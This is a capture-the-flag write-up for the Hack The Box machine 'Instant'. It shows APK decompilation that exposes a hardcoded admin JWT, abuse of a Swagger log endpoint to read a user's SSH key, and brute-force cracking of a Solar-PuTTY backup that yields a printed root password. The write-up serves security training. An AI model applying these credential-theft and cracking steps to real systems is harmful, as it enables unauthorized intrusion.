---
layout: post
title: 'HTB: Instant | Write-up'
date: 2025-04-28 09:40 +0000
categories: [HTB]
tags: [htb, reverse engineering, web, privilege escalation, exploitation]
comments: false
image: /post-imgs/instant-writeup/instant-bg-2.png
---

## Overview

Instant is a Medium difficulty box on the Hack The Box platform that introduces players to simple mobile application reverse engineering. 

Let's get started!

___
## Enumeration

### Nmap Scan

As always, we start our recon by an Nmap scan.

```shell-session
nmap --disable-arp-ping -Pn -n <IP>
```
![nmap-scan](/post-imgs/instant-writeup/instant-1.png)

```shell-session
nmap -A -p 80,22 <IP>
```
![nmap-scan](/post-imgs/instant-writeup/instant-2.png)

Our scan shows 2 open ports, an Apache Web Server at port 80 and SSH at port 22.

___
### Web Enumeration

![web-enum](/post-imgs/instant-writeup/instant-3.png)

Upon visiting the website, we found a downlaodable APK file. We can decompile this using the tool [JADX](https://github.com/skylot/jadx)

___
### Mobile application RE

Looking through the decompiled source code, We can find 2 subdomains and an Admin JWT token.

![apk-enum](/post-imgs/instant-writeup/instant-4.png)

![apk-enum](/post-imgs/instant-writeup/instant-5.png)

![apk-enum](/post-imgs/instant-writeup/instant-6.png)

![apk-enum](/post-imgs/instant-writeup/instant-7.png)

#### Subdomains: 

`mywalletv1.instant.htb` `swagger-ui.instant.htb`

#### JWT Tokens: 
```shell-session
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```

`mywalletv1.instant.htb` returns a `404` page. so I focused on the `swagger-ui.instant.htb` subdomain instead.

___
### `swagger-ui.instant.htb` Enumeration

![swagger-enum](/post-imgs/instant-writeup/instant-8.png)

![swagger-enum](/post-imgs/instant-writeup/instant-9.png)

On the `Authorize` button, I inserted the `JWT token` that we found to login as Admin.

In this page we can see users:

![swagger-enum](/post-imgs/instant-writeup/instant-10.png)

We can also read certain files on the `Logs` section. Here we can use this function to retrieve the rsa key of a user.

![swagger-enum](/post-imgs/instant-writeup/instant-11.png)

![swagger-enum](/post-imgs/instant-writeup/instant-12.png)

![swagger-enum](/post-imgs/instant-writeup/instant-13.png)

Save this `RSA key`. We can use this simple `Bash` command to clean the strings. This removes the `", \n` string.

```shell-session
cat id_rsa | sed 's/^ *"//; s/",*$//; s/\\n//g'
```
Give it appropriate persmissions:

```shell-session
chmod 600 id_rsa
```

Now we can try to login into the SSH as user `shirohige` using this key. Here we found our user flag.

![ssh](/post-imgs/instant-writeup/instant-14.png)

___
## Privilege Escalation

`linpeas.sh` reveals some interesting directories and files, specifically this.

![privesc](/post-imgs/instant-writeup/instant-15.png)

I downloaded this file to my local attack machine.

```shell-session
scp -i id_rsa shirohige@instant.htb:/opt/backups/Solar-PuTTY/sessions-backup.dat ./ 
```

Looking it up, I found out that I can brute force the file to see the credentials stored inside. I used a [python tool](https://github.com/ItsWatchMakerr/SolarPuttyCracker) to bruteforce and decrypt the session backup file.

```shell-session
python3 SolarPuttyCracker.py -w /usr/share/wordlists/rockyou.txt ../../sessions-backup.dat 
```
![privesc](/post-imgs/instant-writeup/instant-16.png)

![privesc](/post-imgs/instant-writeup/instant-17.png)

`root:12**24nzC!r0c%q12`

We found the password of `root`. 

![privesc](/post-imgs/instant-writeup/instant-18.png)







